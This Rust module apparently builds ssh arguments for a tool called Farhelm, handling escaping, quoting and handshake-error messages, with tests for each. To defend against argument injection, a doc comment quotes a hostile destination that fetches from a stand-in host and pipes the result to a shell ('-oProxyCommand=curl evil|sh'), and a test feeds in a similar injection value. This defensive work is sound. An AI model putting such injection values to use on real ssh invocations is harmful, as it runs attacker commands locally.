//! The ssh argv that reaches a remote supervisor, and the one failure of
//! that argv worth translating.
//!
//! Farhelm never speaks ssh itself — it shells out to the user's own
//! `ssh`, which is the whole point of SPEC.md's transport story (their
//! config, their keys, their agent, their jump hosts). What is left on
//! this side is text: a vector of arguments, assembled from registry rows
//! the user wrote. That assembly is where this transport's subtlest bug
//! class lives — and it is pure, so the tests below pin it exactly. What
//! CI cannot run is the transport AROUND it: no reachable remote host, no
//! keys, no agent, so a wrong argv would otherwise surface only on a user's
//! machine. Pinning the argv is how that gap is covered.
//!
//! ## Two layers of quoting, neither of them shell-quoting the argv
//!
//! The argv is not exec'd remotely. ssh joins everything after the
//! destination with spaces and hands the resulting STRING to the remote
//! login shell, so the remote command has to be quoted for a shell that
//! runs on another machine. Separately, `-o` values are parsed with
//! ssh_config tokenization and percent expansion, which is a different
//! grammar again. `ssh_control_path_option` handles the second;
//! [`shell_words`] handles the first.
//!
//! ## The prefix is a security boundary, so it is built in one place
//!
//! `ssh_base_args` owns everything up to and including the destination —
//! the connection-multiplexing options, the option terminator, and the
//! destination's placement AFTER that terminator. That ordering is what
//! keeps a user-supplied destination from being read as an ssh option (see
//! its docs), so it is stated once here and inherited by every remote
//! command built on top of it. `ssh_stdio_args` is that one command today:
//! the `farhelm internal stdio` proxy the connection manager talks the wire
//! protocol to.

use anyhow::Context;
use farhelm_proto::io::ClosedBeforeHello;

/// The ssh argv prefix shared by every remote command: the options, the
/// terminator, and the destination.
///
/// **`--` goes before the DESTINATION, not after it**, and that ordering is
/// a security boundary rather than a stylistic choice. A destination is
/// user-supplied text — a registry row anyone with helm access can write,
/// through `POST /api/hosts` or an `--ensure-hosts` file — so a value
/// shaped like
/// `-oProxyCommand=curl evil|sh` is parsed by OpenSSH's own getopt loop as
/// an OPTION and executed — a local command injection with no ssh
/// connection involved at all — for as long as the option terminator sits
/// anywhere after it. Placed first, `--` ends option parsing before ssh
/// ever looks at the destination, and it still covers the remote argv
/// (`--state-dir` in [`ssh_stdio_args`]) that the old placement was
/// protecting.
/// [`crate::store::HelmStore::add_ssh_host`] additionally refuses
/// option-shaped destinations at the registry boundary so the user gets a
/// clear error instead of a puzzling ssh failure; THIS ordering is the
/// actual guard, and it holds for callers that never go through the store.
///
/// The UTF-8 requirement enforced below is specific to this ssh path; the
/// local host's unix-socket transport keeps native `OsString` state paths
/// and still tolerates non-UTF-8 homes (see
/// `farhelm_supervisor::default_state_dir`), so a helm with no ssh rows
/// never meets this requirement at all.
fn ssh_base_args(dest: &str, control_path: &std::path::Path) -> anyhow::Result<Vec<String>> {
    // This is the last point a local filesystem path is still a `Path`
    // before it is embedded in text handed to ssh. The alternative,
    // `Path::to_string_lossy`, does not fail on a non-UTF-8 path — it
    // silently substitutes replacement characters and produces a
    // *different* path, which ssh would then happily create or connect to
    // a ControlMaster socket under, with no indication anything went
    // wrong. Rejecting loudly here, naming the path, is what makes ssh
    // config values and argv text safe to build from a `Path`: unlike
    // `ControlMsg::cwd` (farhelm-proto's own UTF-8-only wire contract),
    // this path never crosses the protocol at all — the requirement here
    // comes from ssh treating both its `-o` values and its remote argv as
    // text, not from anything upstream.
    let control_path_str = control_path.to_str().with_context(|| {
        // `to_string_lossy`, not `{control_path:?}`: the point of naming
        // the path in the error is so the user can recognize WHICH one is
        // unusable, and Debug's `\xFF`-escaped form is far less
        // recognizable at a glance than the lossy rendering of the parts
        // that are valid UTF-8.
        format!(
            "path {} is not valid UTF-8; ssh's ControlPath option and remote argv are handled \
             as text and cannot represent it — rename it or point --state-dir elsewhere",
            control_path.to_string_lossy()
        )
    })?;
    let control_path = ssh_control_path_option(control_path_str);
    Ok(vec![
        "-o".to_string(),
        "BatchMode=yes".to_string(),
        "-o".to_string(),
        "ControlMaster=auto".to_string(),
        "-o".to_string(),
        control_path,
        "-o".to_string(),
        "ControlPersist=60".to_string(),
        // See this function's own docs: the terminator precedes the
        // destination so an option-shaped destination can never be read as
        // an option.
        "--".to_string(),
        dest.to_string(),
    ])
}

/// The ssh argv for reaching a remote supervisor, as a pure function so
/// the quoting seam is unit-testable — the ssh path as a whole cannot run
/// in CI, and this argv is where its subtlest bug class lives.
///
/// The trailing argv after the destination is not exec'd remotely: ssh
/// joins it with spaces and hands the string to the remote login shell,
/// so anything that may contain spaces (the remote state dir) must be
/// quoted as that shell will parse it, or the path word-splits remotely.
///
/// Everything before the remote command — including the option-terminator
/// placement that makes a hostile destination harmless — is
/// [`ssh_base_args`]' business, not this function's.
pub(crate) fn ssh_stdio_args(
    dest: &str,
    control_path: &std::path::Path,
    remote_farhelm: &str,
    remote_state_dir: Option<&str>,
) -> anyhow::Result<Vec<String>> {
    let mut args = ssh_base_args(dest, control_path)?;
    args.extend([
        shell_words::quote(remote_farhelm).into_owned(),
        "internal".to_string(),
        "stdio".to_string(),
    ]);
    if let Some(remote_state) = remote_state_dir {
        args.push("--state-dir".to_string());
        args.push(shell_words::quote(remote_state).into_owned());
    }
    Ok(args)
}

/// Encode a ControlPath for OpenSSH's config-value parser.
///
/// This is not shell quoting: `-o` values use ssh_config tokenization,
/// then expand percent tokens. Quotes and backslashes need config
/// escapes, while user-supplied `%` must become `%%`; only the final `%C`
/// added by Farhelm remains an expansion token. Takes `&str` rather than
/// `&Path`: the UTF-8 check belongs to the caller (`ssh_base_args`), the
/// one actual boundary where a local `Path` becomes ssh-config text — this
/// function is a pure string encoder with nothing left to reject.
fn ssh_control_path_option(raw: &str) -> String {
    let (prefix, suffix) = raw
        .strip_suffix("%C")
        .map_or((raw, ""), |prefix| (prefix, "%C"));
    let escaped = prefix
        .replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('%', "%%");
    format!("ControlPath=\"{escaped}{suffix}\"")
}

/// Turn "the ssh channel closed before the handshake finished" into
/// something that names the CANDIDATE causes instead of just the symptom.
///
/// Nothing on this side can narrow it further, and the message says so
/// rather than picking one. Two quite different failures land here
/// identically. The common one: `farhelm internal stdio` on the remote
/// dials the local supervisor socket before it speaks a word of the wire
/// protocol, so a host with no supervisor bound makes the proxy exit
/// immediately — and the remote's own `Error: ... Connection refused`
/// reaches the operator only as relayed ssh stderr, disconnected from
/// this side's `anyhow` chain. The other: ssh itself never got as far as
/// running anything (auth refused, host unresolvable, `remote_farhelm`
/// missing), which also closes the channel with zero bytes spoken. Both
/// produce a byte-for-byte identical [`ClosedBeforeHello`], so the remedy
/// is offered as a possibility and the operator is pointed at the ssh
/// stderr that disambiguates it.
///
/// Matching is by TYPE, never by `io::ErrorKind`: a peer that spoke half a
/// hello and died raises `UnexpectedEof` as well, and telling that
/// operator to go start a supervisor would be a wrong answer stated
/// confidently. Everything else (a version-skewed peer that spoke and was
/// refused, a decode failure) already carries its own accurate message and
/// passes through untouched.
///
/// `remote_state_dir` is the registry row's own field (M1's
/// `--remote-state-dir`, now per-host), passed through so the suggested
/// command is one the operator can paste: a supervisor started without it
/// binds a socket the remote proxy will not dial.
pub(crate) fn annotate_ssh_handshake_eof(
    e: anyhow::Error,
    dest: &str,
    remote_state_dir: Option<&str>,
) -> anyhow::Error {
    let closed_before_hello = e
        .chain()
        .filter_map(|cause| cause.downcast_ref::<std::io::Error>())
        .any(ClosedBeforeHello::is_cause_of);
    if !closed_before_hello {
        return e;
    }
    // Quoted the way the REMOTE shell will read it, matching how the same
    // directory is passed in `ssh_stdio_args` — a path with a space has to
    // survive being pasted into a shell there.
    let remedy = match remote_state_dir {
        Some(dir) => format!(
            "farhelm supervisor run --state-dir {}",
            shell_words::quote(dir)
        ),
        None => "farhelm supervisor run".to_string(),
    };
    e.context(format!(
        "the ssh channel to {dest} closed before the handshake completed: either no supervisor \
         is running on {dest} (start one there with `{remedy}`), or the ssh connection itself \
         failed — ssh reports its own errors on stderr, which the connection manager relays \
         into the helm's log for this host"
    ))
}

#[cfg(test)]
mod tests {
    use farhelm_proto::io::{FrameReader, FrameWriter, handshake};
    use farhelm_proto::{ControlMsg, Frame};
    use tokio::io::AsyncWriteExt;

    /// The remote state dir rides ssh's trailing argv, which the remote
    /// login shell re-parses — a path with spaces must survive as one
    /// token. `shell_words::split` is the inverse oracle for the quoting.
    /// ssh tokenizes `-o` values like config-file lines, so a local
    /// state dir containing a space must arrive quoted — otherwise every
    /// `--ssh` connection from that state dir dies at startup.
    #[test]
    fn ssh_args_quote_a_control_path_containing_spaces() {
        let args = super::ssh_stdio_args(
            "user@host",
            std::path::Path::new("/home/u/my state/ssh-cm-%C"),
            "farhelm",
            None,
        )
        .unwrap();
        assert!(
            args.contains(&"ControlPath=\"/home/u/my state/ssh-cm-%C\"".to_string()),
            "ControlPath must be quoted for ssh's own parser: {args:?}"
        );
    }

    /// OpenSSH expands percent tokens after parsing `-o`, so a state
    /// directory containing `%d` must stay literal while Farhelm's final
    /// `%C` remains active. Quotes and backslashes exercise the separate
    /// config-tokenization layer; shell quoting would not protect them.
    #[test]
    fn ssh_args_escape_control_path_config_syntax() {
        let args = super::ssh_stdio_args(
            "user@host",
            std::path::Path::new("/home/u/%d/\"quoted\"/back\\slash/ssh-cm-%C"),
            "farhelm",
            None,
        )
        .unwrap();
        assert!(args.contains(
            &"ControlPath=\"/home/u/%%d/\\\"quoted\\\"/back\\\\slash/ssh-cm-%C\"".to_string()
        ));
    }

    /// The remote argv, as ssh will hand it to the remote login shell:
    /// everything after the option terminator AND the destination that now
    /// follows it (see [`ssh_args_terminate_options_before_the_destination`]
    /// for why the destination sits there).
    fn remote_command(args: &[String]) -> Vec<String> {
        let dashdash = args.iter().position(|a| a == "--").expect("-- separator");
        let remote = args[dashdash + 2..].join(" ");
        shell_words::split(&remote).expect("remote command must be shell-parseable")
    }

    /// The argv-injection regression: OpenSSH parses options up to the
    /// terminator, so a destination shaped like `-oProxyCommand=...` is read
    /// as an OPTION — and `ProxyCommand` runs a LOCAL shell command — for as
    /// long as `--` sits after it. This pins the ordering that closes it:
    /// the terminator precedes the destination, and the destination is
    /// therefore always a positional argument no matter what it contains.
    ///
    /// Asserted on the argv itself rather than by running ssh, because the
    /// bug is entirely in argument order and the exploit would otherwise
    /// need a real ssh, a real shell, and an observable side effect to
    /// detect.
    #[test]
    fn ssh_args_terminate_options_before_the_destination() {
        let hostile = "-oProxyCommand=touch /tmp/pwned";
        let args = super::ssh_stdio_args(
            hostile,
            std::path::Path::new("/state/ssh-cm-%C"),
            "farhelm",
            Some("/remote/state"),
        )
        .unwrap();
        let dashdash = args.iter().position(|a| a == "--").expect("-- separator");
        assert_eq!(
            args[dashdash + 1],
            hostile,
            "the destination must sit immediately after the option terminator: {args:?}"
        );
        assert!(
            !args[..dashdash].iter().any(|a| a == hostile),
            "no copy of the destination may precede the terminator: {args:?}"
        );
        // The remote argv the old placement was protecting must still be
        // covered: `--state-dir` is past the terminator too.
        assert_eq!(
            remote_command(&args),
            vec![
                "farhelm",
                "internal",
                "stdio",
                "--state-dir",
                "/remote/state"
            ]
        );
    }

    /// The executable is part of ssh's reconstructed remote command too,
    /// not a local argv passed directly to exec. It needs the same POSIX
    /// quoting as the remote state directory.
    #[test]
    fn ssh_args_quote_the_remote_executable_for_the_remote_shell() {
        let args = super::ssh_stdio_args(
            "user@host",
            std::path::Path::new("/state/ssh-cm-%C"),
            "/opt/far helm's/bin",
            None,
        )
        .unwrap();
        assert_eq!(
            remote_command(&args),
            vec!["/opt/far helm's/bin", "internal", "stdio"]
        );
    }

    #[test]
    fn ssh_args_quote_the_remote_state_dir_for_the_remote_shell() {
        let args = super::ssh_stdio_args(
            "user@host",
            std::path::Path::new("/state/ssh-cm-%C"),
            "farhelm",
            Some("/home/u/my state/farhelm"),
        )
        .unwrap();
        assert_eq!(
            remote_command(&args),
            vec![
                "farhelm",
                "internal",
                "stdio",
                "--state-dir",
                "/home/u/my state/farhelm"
            ]
        );
    }

    /// `ssh_base_args` is the enforcement point for a local ControlPath that
    /// happens to contain non-UTF-8 bytes (a stray mount, a mis-encoded
    /// filename): without the check inlined there, the path would flow
    /// into `Path::to_string_lossy` further down the ssh argv builder and
    /// get silently rewritten into a *different* path — one ssh would
    /// then create or reuse a ControlMaster socket under with no error
    /// and no hint that the path it acted on was not the one on disk.
    /// Asserting the offending path's lossy display appears in the error
    /// pins that the message tells the user WHICH path is unusable, not
    /// just that "something" was not UTF-8 — bypassing the check at the
    /// call site, or degrading the error to something generic, fails this
    /// test. A valid-UTF-8 control path (covered by the quoting tests
    /// above) must keep passing through unchanged.
    #[test]
    fn ssh_args_rejects_a_non_utf8_control_path_naming_it_in_the_error() {
        use std::ffi::OsStr;
        use std::os::unix::ffi::OsStrExt;

        let non_utf8 = std::path::Path::new(OsStr::from_bytes(b"/home/u/\xffstate/ssh-cm-%C"));
        let err = super::ssh_stdio_args("user@host", non_utf8, "farhelm", None).unwrap_err();
        let rendered = format!("{err:#}");
        assert!(
            rendered.contains(&non_utf8.to_string_lossy().into_owned()),
            "error should name the offending path so the user can see which one: {rendered}"
        );
    }

    /// Run a real [`handshake`] against a peer that writes `peer_prefix`
    /// and then closes its write direction, and return the failure as the
    /// helm's `anyhow` chain would carry it.
    ///
    /// Synthesizing an `io::Error` here instead would test nothing: the
    /// whole question these tests ask is whether the error `handshake`
    /// ACTUALLY produces is the one `annotate_ssh_handshake_eof` matches,
    /// and a hand-built stand-in would keep passing after the two drifted
    /// apart. The peer half is kept alive (to the end of this scope) and
    /// only its WRITE direction is shut down — dropping it whole would
    /// fail this side's hello write instead, and the read-side failure
    /// under test would never be reached.
    async fn handshake_failure_against(peer_prefix: &[u8]) -> anyhow::Error {
        let (a, mut b) = tokio::io::duplex(64 * 1024);
        b.write_all(peer_prefix).await.unwrap();
        b.shutdown().await.unwrap();
        let (ar, aw) = tokio::io::split(a);
        let mut r = FrameReader::new(ar);
        let mut w = FrameWriter::new(aw);
        anyhow::Error::new(handshake(&mut r, &mut w, "helm").await.unwrap_err())
    }

    /// MT-1 regression: a dead ssh proxy must not surface as a bare
    /// "connection closed before hello" with no hint that a supervisor may
    /// need starting. The annotator is exercised over a real handshake but
    /// not through `connect_supervisor`, which needs an actual `ssh` child
    /// and would cost far more for the same coverage.
    ///
    /// The message must offer BOTH live possibilities. This side cannot
    /// tell "no supervisor there" from "ssh never connected" — they arrive
    /// identically — so naming only the first would state a guess as a
    /// diagnosis and send the operator to the wrong host to fix it.
    #[tokio::test]
    async fn annotate_ssh_handshake_eof_names_host_and_remedy_on_clean_close() {
        let err = super::annotate_ssh_handshake_eof(
            handshake_failure_against(&[]).await,
            "user@host",
            None,
        );
        let rendered = format!("{err:#}");
        assert!(
            rendered.contains("user@host") && rendered.contains("farhelm supervisor run"),
            "must name the host and the fix: {rendered}"
        );
        assert!(
            rendered.contains("ssh connection itself failed"),
            "must also offer the ssh-transport possibility, not just a missing supervisor: \
             {rendered}"
        );
        assert!(
            rendered.contains("connection closed before hello"),
            "the underlying error must survive in the chain, not just the new wrapper: {rendered}"
        );
    }

    /// With `--remote-state-dir` in play, a remedy without `--state-dir`
    /// is worse than none: pasted as printed it starts a supervisor
    /// bound under the remote's DEFAULT state dir, which the proxy — told
    /// to use the given one — still will not find, so the operator
    /// "fixes" the problem and sees the identical error again.
    #[tokio::test]
    async fn annotate_ssh_handshake_eof_remedy_carries_the_remote_state_dir() {
        let err = super::annotate_ssh_handshake_eof(
            handshake_failure_against(&[]).await,
            "user@host",
            Some("/srv/my state/farhelm"),
        );
        let rendered = format!("{err:#}");
        assert!(
            rendered.contains("farhelm supervisor run --state-dir '/srv/my state/farhelm'"),
            "the remedy must be pasteable into the remote shell, quoting included: {rendered}"
        );
    }

    /// A peer that spoke half a hello and died is a DIFFERENT failure that
    /// happens to share `ErrorKind::UnexpectedEof`: something was running
    /// on that host and crashed mid-sentence. Telling that operator to
    /// start a supervisor would point them away from the real problem, so
    /// the mid-frame diagnostic must reach them unedited. Guards against
    /// the matcher regressing to a kind check.
    #[tokio::test]
    async fn annotate_ssh_handshake_eof_leaves_a_mid_frame_death_untouched() {
        let mut hello = Vec::new();
        Frame::control(&ControlMsg::hello("supervisor"))
            .encode(&mut hello)
            .unwrap();
        let raw = handshake_failure_against(&hello[..hello.len() / 2]).await;
        let before = format!("{raw:#}");
        let err = super::annotate_ssh_handshake_eof(raw, "user@host", None);
        let rendered = format!("{err:#}");
        assert_eq!(
            rendered, before,
            "a mid-frame death must pass through byte for byte"
        );
        assert!(
            rendered.contains("mid-frame") && !rendered.contains("farhelm supervisor run"),
            "the mid-frame diagnostic must survive and gain no guessed remedy: {rendered}"
        );
    }

    /// A handshake failure that is not an EOF at all (protocol mismatch, a
    /// peer that spoke garbage, ...) already carries its own specific,
    /// accurate message. Asserting the error survives IDENTICALLY — kind,
    /// message, chain depth — rather than merely lacking the remedy
    /// string: an annotator that wrapped every error in a vaguer context
    /// while only appending the remedy conditionally would pass the weaker
    /// check and still bury the real diagnosis.
    #[test]
    fn annotate_ssh_handshake_eof_leaves_other_errors_untouched() {
        let mismatch = std::io::Error::other("protocol version mismatch: peer speaks v1...");
        let err = super::annotate_ssh_handshake_eof(
            anyhow::Error::new(mismatch),
            "user@host",
            Some("/srv/state"),
        );
        assert_eq!(err.chain().count(), 1, "no context layer may be added");
        let io = err
            .downcast_ref::<std::io::Error>()
            .expect("the original io::Error must still be the error itself");
        assert_eq!(io.kind(), std::io::ErrorKind::Other);
        assert_eq!(
            io.to_string(),
            "protocol version mismatch: peer speaks v1..."
        );
    }
}
